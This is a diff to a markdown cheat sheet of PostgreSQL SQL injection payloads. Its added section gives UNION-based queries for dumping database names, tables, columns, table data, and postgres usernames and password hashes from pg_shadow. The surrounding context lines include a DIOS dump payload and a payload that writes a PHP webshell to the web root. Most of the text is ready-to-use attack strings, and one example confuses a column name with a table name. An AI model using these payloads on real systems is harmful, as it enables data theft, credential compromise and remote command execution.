@@ -257,6 +257,56 @@ Copy the UNION based payload which shows the vulnerable column, in my case this 
 Because the vulnerable column was **2**, simply replace the second *null* with the DIOS payload:  
 ```http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,(select+array_to_string(array(select+table_name||':::'||column_nam e::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E')),null,null```
 
+## Manually dumping  
+DIOS are complex queries and sometime they leads to errors, so using simpler queries to do specific dumping (like tables or columns) might be a better idea.
+
+### Dump database names
+```'+union+select+cast(datname+as+int),null,null,null,null,null++FROM+pg_database--```  
+or without casting to int:  
+```'+union+select+datname,null,null,null,null,null++FROM+pg_database--```
+
+### Dump tables
+Let's assume that there are 4 columns in total and the first column is vulnerable. The following query can be used to dump all the tables:  
+```' union select cast(table_name as int), null, null, null FROM information_schema.tables--```  
+or without casting to int:  
+```' union select table_name, null, null, null FROM information_schema.tables--```  
+
+Another query to dump tables via **ARRAY_AGG** function (thanks [@Nikhil](https://github.com/0xw0lf) for the query):  
+```-1 ' UNION ALL SELECT NULL,ARRAY_AGG(COALESCE(tablename::text,' '))::text,NULL,NULL,NULL FROM pg_tables WHERE schemaname IN ('<database>')--```
+
+### Dump columns  
+You can only dump columns table per table (unless if you use DIOS which shows every columns of every table). In this case, we want to dump the columns of a table named **users**:  
+```union select cast(column_name as int), null, null, null FROM information_schema.columns WHERE table_name='users'--+```  
+or without casting to int:  
+```union select column_name, null, null, null FROM information_schema.columns WHERE table_name='users'--+```  
+
+If none of the mentioned queries worked, try dumping with **ARRAY_AGG** function (thanks [@Nikhil](https://github.com/0xw0lf) for the query):  
+```-1' UNION ALL SELECT NULL,NULL,ARRAY_AGG(COALESCE(attname::text,(CHR(32))))::text,NULL,NULL FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='<table>' AND nspname='<database>'--```
+
+### Dump data  
+Assume that inside table **users** there is a column called **password**, let's dump that column:  
+```' union select cast(data_column as int), null, null, null FROM password--+```  
+or without casting to int:  
+```' union select data_column, null, null, null FROM password--+```  
+
+Another query to dump data via **ARRAY_AGG** function (thanks [@Nikhil](https://github.com/0xw0lf) for the query):  
+```1' UNION ALL SELECT NULL,ARRAY_AGG(COALESCE(name::text,(' ')))::text,NULL,NULL,NULL FROM <database>.<table> ORDER BY <column>--```  
+For example:  
+```1' UNION ALL SELECT NULL,ARRAY_AGG(COALESCE(name::text,(' ')))::text,NULL,NULL,NULL FROM public.users ORDER BY name--```
+
+### Dump PostgreSQL user's username & password hash  
+Let's assume that the database has 5 columns and the first one is vulnerable.   
+
+Dump postgres username:  
+```'+union+select+cast(usename+as+int),null,null,null,null++FROM+pg_shadow--```  
+If that doesn't work, try the same query without doing the casting to int:  
+```http://website.com/products/detail?id=-1' union select usename,null,null,null,null from pg_shadow--```  
+
+Dump postgres user's password:  
+```'+union+select+cast(passwd+as+int),null,null,null,null++FROM+pg_shadow--```  
+If that doesn't work, try the same query without doing the casting to int:   
+```http://website.com/products/detail?id=-1' union select passwd,null,null,null,null from pg_shadow--```  
+
 ### Write file (Webshell)
 
 ```UNION SELECT '<?php $out = shell_exec($_GET["x"]); echo "<pre>$out</pre>";?>' \g /var/www/test.php; --```
